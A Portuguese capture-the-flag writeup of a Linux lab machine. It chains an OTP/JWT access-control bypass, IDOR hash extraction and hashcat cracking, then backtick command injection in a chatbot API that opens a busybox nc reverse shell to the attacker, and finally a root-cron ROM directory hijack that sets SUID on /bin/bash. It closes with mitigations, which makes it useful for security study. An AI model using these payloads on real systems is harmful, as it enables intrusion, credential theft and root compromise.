# 🎯 Writeup — Máquina Retro

> **Dificuldade:** Médio | **SO:** Linux | **Tags:** `API Fuzzing` · `IDOR` · `Broken Access Control` · `Hash Cracking` · `Command Injection` · `ROM Emulator PrivEsc`

---

## 1. Sumário Executivo

O comprometimento total foi alcançado através de uma cadeia de quatro vulnerabilidades encadeadas em uma plataforma de jogos arcade (Django). O ataque iniciou com **Broken Access Control** no fluxo de autenticação OTP — o token JWT era gerado antes da validação do código, permitindo acesso direto ao `/dashboard` sem completar a autenticação. Autenticado, uma vulnerabilidade de **IDOR** no endpoint `/api/profile/{id}` possibilitou enumerar perfis de outros usuários e extrair o hash Django do usuário `ronin@games.com`, quebrado via **hashcat**. Com o acesso ao plano premium, uma funcionalidade de chatbot expôs uma vulnerabilidade de **Command Injection** via backticks, resultando em uma reverse shell no servidor. A escalação de privilégios foi obtida através de uma lógica insegura em `verification_rom.py`: o script executado como `root` criava um diretório de ROMs caso não existisse e executava arquivos `.smc` nele — permitindo substituir o diretório por um controlável e injetar um payload que habilitou o SUID no `/bin/bash`.

---

## 2. Reconhecimento

### 2.1 Scan de Portas

```bash
nmap -sC -sV <IP_ALVO>
```

**Resultado:**

| Porta | Serviço |
|-------|---------|
| 22    | SSH     |
| 80    | HTTP (Aplicação Django — plataforma de jogos arcade) |

### 2.2 Configuração de DNS Local

A aplicação em `http://<IP_ALVO>` redireciona para o domínio `retro.hc`. Para resolver o hostname localmente:

```bash
sudo nano /etc/hosts
# Adicionar:
<IP_ALVO>   retro.hc
```

### 2.3 Fuzzing de Rotas da API

A aplicação expõe uma API. Com ffuf, foram enumeradas as rotas disponíveis:

```bash
ffuf -u http://retro.hc/api/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
```

**Rotas identificadas:**

| Endpoint | Descrição |
|----------|-----------|
| `/api/login` | Autenticação |
| `/api/register` | Criação de conta |
| `/api/profile/{id}` | Perfil do usuário — **vulnerável a IDOR** |
| `/api/chatbot` | Chat com IA — **vulnerável a Command Injection** |

---

## 3. Exploração — Acesso Inicial via Broken Access Control (OTP Bypass)

### 3.1 Registro de Usuário

Com a rota `/api/register` descoberta, foi criada uma conta na plataforma.

### 3.2 Fluxo de Autenticação Quebrado

Ao realizar o login, a aplicação solicitou um **código OTP** para verificação em dois fatores. Porém, ao interceptar a requisição com Burp Suite, foi identificado que:

> ⚠️ **O token JWT de sessão já havia sido gerado e retornado pela API antes da validação do OTP**, e a resposta da API incluía o path `/dashboard` como destino pós-autenticação.

### 3.3 Bypass — Acesso Direto ao Dashboard

Utilizando o JWT já emitido e acessando diretamente o endpoint `/dashboard` sem enviar o OTP:

```
GET http://retro.hc/dashboard
Authorization: Bearer <JWT gerado no login>
```

**Resultado:** Acesso concedido ao painel autenticado sem validação do OTP.

> 🔑 **Falha crítica:** O controle de acesso não verifica se o OTP foi validado antes de aceitar o JWT como autenticado. A autorização é tratada apenas no frontend, sem enforcement no backend.

---

## 4. Exploração — IDOR e Hash Cracking

### 4.1 Identificação do IDOR em `/api/profile/{id}`

Ao acessar o perfil do próprio usuário, foi identificada a requisição:

```http
GET /api/profile/1
Authorization: Bearer <JWT>
```

O parâmetro `id` era completamente manipulável, sem validação de propriedade. Ao iterar os IDs:

```bash
# Enumeração manual ou com ffuf/burp intruder
for i in $(seq 1 20); do
    curl -s http://retro.hc/api/profile/$i \
         -H "Authorization: Bearer <JWT>" | python3 -m json.tool
done
```

**Resultado:** O **ID 12** retornou o perfil do usuário `ronin@games.com` contendo o hash Django de sua senha.

> ⚠️ **Falha:** Ausência de autorização baseada em objeto (BOLA/IDOR). Qualquer usuário autenticado pode ler dados de qualquer outro usuário.

### 4.2 Identificação e Quebra do Hash Django

O hash retornado pelo IDOR estava no formato **Django PBKDF2** (`pbkdf2_sha256$...`), identificado pelo prefixo. Usando hashcat:

```bash
hashcat -a 0 -m 10000 hash.txt \
        /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

> `hashcat -m 10000` = Django (PBKDF2-SHA256)

**Credencial obtida:**

```
ronin@games.com : <senha_quebrada>
```

> 🔑 Login realizado com as credenciais do usuário premium `ronin@games.com`.

---

## 5. Exploração — Command Injection no Chatbot

### 5.1 Análise da Funcionalidade

O usuário `ronin@games.com` possuía acesso ao plano premium, que incluía uma funcionalidade de **chatbot**. Ao interceptar a requisição da API:

```http
POST /api/chatbot
Content-Type: application/json
Authorization: Bearer <JWT_ronin>

{"message": "Hello"}
```

### 5.2 Confirmação de Command Injection via Backticks

A mensagem era processada server-side sem sanitização. O uso de **backticks** (operador de execução de shell) no campo `message` resultou em execução de comandos:

```json
{"message": "`id`Hello"}
```

**Resposta:** Saída do comando `id` incluída na resposta da API.

### 5.3 Reverse Shell via BusyBox

Configurando o listener:

```bash
nc -lvnp 443
```

Payload enviado para o chatbot:

```json
{
    "message": "`busybox nc <IP_VPN> 443 -e bash`Hello"
}
```

Conexão recebida como usuário da aplicação Django.

---

## 6. Pós-Exploração — Estabilização e Flag de Usuário

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
# Ctrl+Z
stty raw -echo; fg
# Enter
export TERM=xterm
```

**Flag de Usuário:** Encontrada no diretório home do usuário comprometido.

---

## 7. Escalação de Privilégios (PrivEsc) — ROM Emulator Script Hijacking

### 7.1 Code Review do `verification_rom.py`

Foi identificado o script `/home/appuser/verification_rom.py` executado como `root` (via cron). Analisando sua lógica:

```python
# Lógica simplificada do script
rom_source = "/home/appuser/roms"

if not os.path.exists(rom_source):
    os.makedirs(rom_source)           # Cria o diretório se não existir

# Executa todos os arquivos .smc encontrados no diretório
for rom in glob.glob(f"{rom_source}/*.smc"):
    subprocess.run([emulator_binary, rom], ...)   # Roda como root
```

**Vulnerabilidades identificadas:**

1. O script **cria o diretório** `/home/appuser/roms` se não existir, com permissões herdadas do processo `root`.
2. Todos os arquivos `.smc` dentro do diretório são **executados como root**.

> ⚠️ O diretório `/home/appuser/roms` **não era acessível** (sem permissão de leitura/escrita) para o usuário atual — mas era possível **deletá-lo e recriá-lo**.

### 7.2 Exploração — Directory Replacement + Payload .smc

```bash
# Deletar o diretório original (sem permissão de escrita, mas com permissão no pai)
cd /home/appuser
rm -rf roms

# Recriar o diretório com permissões do usuário atual
mkdir roms
cd roms

# Criar payload .smc que aplica SUID no /bin/bash
echo -e '#!/bin/bash\nchmod +s /bin/bash' > xpl.smc
chmod +x xpl.smc
```

### 7.3 Gatilho e Exploração

Aguardando a próxima execução do cron que chama `verification_rom.py` como root:

```bash
# Verificar se o SUID foi aplicado
ls -la /bin/bash
# -rwsr-sr-x 1 root root ... /bin/bash

# Obter shell de root
/bin/bash -p
whoami
# root
```

**Flag de Root:** Obtida em `/root/root.txt`.

---

## 8. Diagrama da Cadeia de Ataque

```
[Registro → Login → OTP solicitado]
        │
        ▼
  JWT gerado ANTES da validação OTP
  + path /dashboard exposto na resposta
        │
        └─► Acesso direto ao /dashboard (OTP Bypass) ✅
                │
                └─► IDOR: /api/profile/{id}
                        │
                        └─► ID 12 → hash Django de ronin@games.com
                                 │
                                 └─► hashcat -m 10000 → senha quebrada
                                          │
                                          └─► Login como ronin (plano premium) ✅
                                                   │
                                                   └─► /api/chatbot (Command Injection)
                                                            │
                                                            └─► `busybox nc` → Reverse Shell ✅
                                                                     │
                                                                     └─► Flag usuário
                                                                     │
                                                                     └─► verification_rom.py (root cron)
                                                                              │
                                                                              └─► rm -rf roms + xpl.smc
                                                                                       │
                                                                                       └─► chmod +s /bin/bash → ROOT ✅
```

---

## 9. Credenciais e Flags

| Item | Valor |
|------|-------|
| **Conta criada** | Usuário registrado via `/api/register` |
| **Usuário comprometido via IDOR** | `ronin@games.com` |
| **Senha ronin** | `<senha quebrada pelo hashcat>` |
| **Flag Usuário** | (obtida no diretório home pós-shell) |
| **Flag Root** | (obtida em `/root/root.txt`) |

---

## 10. Vulnerabilidades Identificadas

| # | Vulnerabilidade | Severidade | CVE/CWE |
|---|-----------------|------------|---------|
| 1 | Broken Access Control — OTP Bypass (JWT emitido antes da validação) | 🔴 Crítico | CWE-287 |
| 2 | IDOR em `/api/profile/{id}` — sem controle de autorização por objeto | 🔴 Crítico | CWE-639 |
| 3 | Hash Django exposto via IDOR e quebrável via dicionário | 🔴 Crítico | CWE-916 |
| 4 | Command Injection via backticks no endpoint `/api/chatbot` | 🔴 Crítico | CWE-78 |
| 5 | Script de root executa arquivos de diretório controlável por usuário não-privilegiado | 🔴 Crítico | CWE-732 |
| 6 | Ausência de sanitização de input no chatbot da API | 🔴 Crítico | CWE-20 |

---

## 11. Ferramentas Utilizadas

| Ferramenta | Uso |
|------------|-----|
| `nmap` | Scan de portas/serviços |
| `ffuf` | Fuzzing de rotas da API |
| `Burp Suite` | Interceptação, análise de requisições e manipulação de parâmetros |
| `hashcat` (`-m 10000`) | Quebra de hash Django PBKDF2-SHA256 |
| `busybox nc` | Reverse shell no servidor (BusyBox netcat) |
| `netcat` (`nc`) | Listener para reverse shells |
| SecLists (`rockyou.txt`, `raft-large-words.txt`) | Wordlists para fuzzing e cracking |

---

## 12. Recomendações de Mitigação

1. **OTP Bypass / Broken Access Control:** O JWT só deve ser emitido e aceito como válido **após** a conclusão de todos os fatores de autenticação. Implementar estado de sessão server-side que marque a sessão como "pendente de MFA" e rejeite requisições autenticadas até a validação completa.
2. **IDOR:** Implementar autorização baseada em objeto (BOLA): verificar no backend se o `id` solicitado pertence ao usuário autenticado. Usar UUIDs aleatórios em vez de IDs sequenciais para dificultar enumeração.
3. **Hash Cracking:** Utilizar algoritmos de hashing com custo computacional elevado e configurados com parâmetros de iteração altos (bcrypt, Argon2id). Garantir que senhas fracas não sejam aceitas no cadastro (política de complexidade + verificação contra listas de senhas vazadas).
4. **Command Injection no Chatbot:** Nunca passar input do usuário diretamente para funções de execução de shell (`os.system`, `subprocess`, `eval`). Usar APIs nativas da linguagem para processamento de texto ou sanitizar rigorosamente com whitelist de caracteres.
5. **ROM Script / Cron como root:** Garantir que o diretório de ROMs pertença ao `root` e não seja deletável por outros usuários (`chmod 755 /home/appuser/roms; chown root:root /home/appuser/roms`). O script deve validar a integridade/assinatura dos arquivos antes de executá-los. Evitar executar arquivos de diretórios graváveis por outros usuários como root.
6. **API Fuzzing / Exposição de rotas:** Implementar autenticação em todas as rotas da API. Rotas administrativas ou sensíveis devem exigir autorização explícita e não devem ser descobertas via wordlist comum.
